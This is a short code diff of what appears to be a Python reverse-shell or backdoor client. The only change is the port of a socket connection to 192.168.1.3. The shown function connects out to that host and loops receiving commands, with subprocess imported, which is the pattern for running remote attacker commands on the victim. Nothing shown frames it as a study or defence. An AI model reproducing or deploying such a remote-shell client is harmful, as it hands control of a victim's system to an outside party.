@@ -4,7 +4,7 @@ import subprocess
 
 def open_connection_to_server():
     sck = socket.socket()
-    sck.connect(("192.168.1.3", 8000))
+    sck.connect(("192.168.1.3", 8080))
     while True:
         cmd = sck.recv(1024)
         if "terminate" in cmd.decode():
